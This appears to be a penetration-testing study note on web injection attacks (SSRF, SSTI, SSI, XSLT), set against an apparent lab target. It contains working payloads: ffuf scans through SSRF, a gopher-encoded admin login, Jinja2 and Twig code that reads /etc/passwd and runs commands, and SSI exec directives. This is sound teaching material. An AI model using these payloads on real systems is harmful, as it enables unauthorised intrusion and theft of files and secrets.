# Server Side Request Forgery (SSRF)

This type of vulnerability occurs when a web application fetches additional resources from a remote location based on user-supplied data, such as a URL.

Suppose a web server fetches remote resources based on user input. In that case, an attacker might be able to coerce the server into making requests to arbitrary URLs supplied by the attacker, i.e., the web server is vulnerable to SSRF.

### Identifying SSRF

An example is a web page which presents the possibility to schedule an appointment using a "check availability" button. We can intercept this request with Burp and then notice that in the request there is a URL to an external resource.

To confirm:
- Change the URL to a your own IP address;
- Start netcat to receive the connection.

### Enumerating the system

We can use the SSRF vulnerability to conduct a port scan of the system to enumerate running services. To achieve this, we need to be able to infer whether a port is open or not from the response to our SSRF payload. If we supply a port that we assume is closed (such as 81), the response contains an error message:
Failed to connect to X.X.X.X port 81: couldn't connect to server.

We can automate this process using FFUF:
```bash
seq 1 10000 > ports.txt
```

Afterward, we can fuzz all open ports by **filtering out responses containing the error message we have identified earlier**.
```bash
 ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

### Accessing restricted endpoints

We can conduct a directory brute-force attack to enumerate additional endpoints using ffuf. To do so, let us first determine the web server's response when we access a non-existing page:
- Example: 404 Not Found

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

We have successfully identified an additional internal endpoint that we can now access through the SSRF vulnerability by specifying the URL http://dateserver.htb/admin.php in the dateserver POST parameter to potentially access sensitive admin information.


### Local File Inclusion (LFI)

we can manipulate the URL scheme to provoke further unexpected behavior. Since the URL scheme is part of the URL supplied to the web application, let us attempt to read local files from the file system using the file:// URL scheme. We can achieve this by supplying the URL **file:///etc/passwd**.
We can use this to read arbitrary files on the filesystem, including the web application's source code.

### The gopher protocol

We can use SSRF to access restricted internal endpoints. However, we are restricted to GET requests as **there is no way to send a POST request with the http:// URL scheme**.

Instead, we can use the **gopher URL scheme** to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.

Assuming we can try to login with common weak passwords against a previous identified endpoint:

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to **URL-encode all special characters** to construct a valid gopher URL from this. In particular, spaces (%20) and newlines (%0D%0A) must be URL-encoded. Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:
- ```gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin```

Our specified bytes are sent to the target when the web application processes this URL. Since we carefully chose the bytes to represent a valid POST request, the internal web server accepts our POST request and responds accordingly. However, since we are sending our URL within the HTTP POST parameter dateserver, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it. Otherwise, we will get a Malformed URL error. After URL encoding the entire gopher URL one more time, we can finally send the request.

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

We can automate this using **Gopherus**.


### Blind SSRF

In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are called blind SSRF vulnerabilities because we cannot see the response. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors.

We can confirm the SSRF vulnerability by:
- Starting a netcat listener in our control;
- Point the SSRF to our IP.


# Server Side Template Injection (SSTI)

As the name suggests, Server-side Template Injection (SSTI) occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server potentially executes the code during the rendering process, enabling an attacker to take over the server completely.

Before exploiting an SSTI vulnerability, it is essential to successfully confirm that the vulnerability is present. Furthermore, we need to identify the template engine the target web application uses, as the exploitation process highly depends on the concrete template engine in use. That is because each template engine uses a slightly different syntax and supports different functions we can use for exploitation purposes.

### Confirming SSTI

The most effective way is to inject special characters with semantic meaning in template engines and observe the web application's behavior. As such, the following test string is commonly used to provoke an error message in a web application vulnerable to SSTI, as it consists of all special characters that have a particular semantic purpose in popular template engines:

- ```${{<%[%'"}}%\.```

Since the above test string should almost certainly violate the template syntax, it should result in an error if the web application is vulnerable to SSTI. This behavior is similar to how injecting a single quote (') into a web application vulnerable to SQL injection can break an SQL query's syntax and thus result in an SQL error.

### Identifying the template engine

To enable the successful exploitation of an SSTI vulnerability, we first need to determine the template engine used by the web application. We can utilize slight variations in the behavior of different template engines to achieve this.
(see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)


### Exploiting Jinja2 example

Jinja is a template engine commonly used in Python web frameworks such as Flask or Django. This section will focus on a Flask web application. The payloads in other web frameworks might thus be slightly different.

We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. For instance, we can obtain the web application's configuration using the following SSTI payload:

```jinja2
{{ config.items() }}
```

Since **this payload dumps the entire web application configuration**, including any used secret keys, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions:

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

We **can use Python's built-in function open to include a local file. However, we cannot call the function directly; we need to call it from the __builtins__ dictionary we dumped earlier**. This results in the following payload to include the file /etc/passwd:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

To achieve remote code execution in Python, we can use functions provided by the os library, such as system or popen. However, if the web application has not already imported this library, we must first import it by calling the built-in function import. This results in the following SSTI payload:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Exploiting Twig example

In Twig, we can use the _self keyword to obtain a little information about the current template:

```twig
{{ _self }}
```

Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework Symfony defines additional Twig filters. One of these filters is file_excerpt and can be used to read local files:

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

To achieve remote code execution, we can use a PHP built-in function such as system. We can pass an argument to this function by using Twig's filter function, resulting in any of the following SSTI payloads:

```twig
{{ ['id'] | filter('system') }}
```


The most popular tool for identifying and exploiting SSTI vulnerabilities is **tplmap**. However, tplmap is not maintained anymore and runs on the deprecated Python2 version. Therefore, we will use the more modern **SSTImap** to aid the SSTI exploitation process.


# Server Side Includes (SSI)

Server-Side Includes (SSI) is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as Apache and IIS. The use of SSI can often be inferred from the file extension. Typical file extensions include .shtml, .shtm, and .stm. However, web servers can be configured to support SSI directives in arbitrary file extensions. As such, we cannot conclusively conclude whether SSI is used only from the file extension.

SSI utilizes directives to add dynamically generated content to a static HTML page. These directives consist of the following components:

- Name: the directive's name
- Parameter name: one or more parameters
- Value: one or more parameter values

An SSI directive has the following syntax:

```ssi
<!--#name param1="value1" param2="value" -->
```

Examples of directives:

- This directive prints environment variables. It does not take any variables:

```ssi
<!--#printenv -->
```

- This directive changes the SSI configuration by specifying corresponding parameters. For instance, it can be used to change the error message using the errmsg parameter:

```ssi
<!--#config errmsg="Error!" -->
```

- This directive prints the value of any variable given in the var parameter. Multiple variables can be printed by specifying multiple var parameters. For instance, the following variables are supported:

- DOCUMENT_NAME: the current file's name;
- DOCUMENT_URI: the current file's URI;
- LAST_MODIFIED: timestamp of the last modification of the current file;
- DATE_LOCAL: local server time.

```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

- This directive executes the command given in the cmd parameter:

```ssi
<!--#exec cmd="whoami" -->
```

- This directive includes the file specified in the virtual parameter. It only allows for the inclusion of files in the web root directory.

```ssi
<!--#include virtual="index.html" -->
```

# Extensible stylesheet language transformation (XSLT)

eXtensible Stylesheet Language Transformation (XSLT) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.

XSLT can be used to define a data format which is subsequently enriched with data from the XML document. XSLT data is structured similarly to XML. However, it contains XSL elements within nodes prefixed with the xsl-prefix. The following are some commonly used XSL elements:

- <xsl:template>: This element indicates an XSL template. It can contain a match attribute that contains a path in the XML document that the template applies to;
- <xsl:value-of>: This element extracts the value of the XML node specified in the select attribute;
- <xsl:for-each>: This element enables looping over all XML nodes specified in the select attribute.

For instance, a simple XSLT document used to output all fruits contained within the XML document as well as their color, may look like this:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

As we can see, the XSLT document contains a single <xsl:template> XSL element that is applied to the <fruits> node in the XML document. The template consists of the static string Here are all the fruits: and a loop over all <fruit> nodes in the XML document. For each of these nodes, the values of the <name> and <color> nodes are printed using the <xsl:value-of> XSL element.

Here are some additional XSL elements that can be used to narrow down further or customize the data from an XML document:
- <xsl:sort>: This element specifies how to sort elements in a for loop in the select argument. Additionally, a sort order may be specified in the order argument;
- <xsl:if>: This element can be used to test for conditions on a node. The condition is specified in the test argument.

**XSLT can be used to generate arbitrary output strings. For instance, web applications may use it to embed data from XML documents within an HTML response**.


### XSLT injection

As the name suggests, XSLT injection occurs whenever user input is inserted into XSL data before output generation by the XSLT processor. This enables an attacker to inject additional XSL elements into the XSL data, which the XSLT processor will execute during output generation.

### Identifying XSLT injection

We can try to pass to a form field an "<" parentesis. If the server return an error, it may indicates the presence of a XSLT injection.

### Information disclosure

We can try to infer some basic information about the XSLT processor in use by injecting the following XSLT elements:

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

Since the web application interpreted the XSLT elements we provided, this confirms an XSLT injection vulnerability.
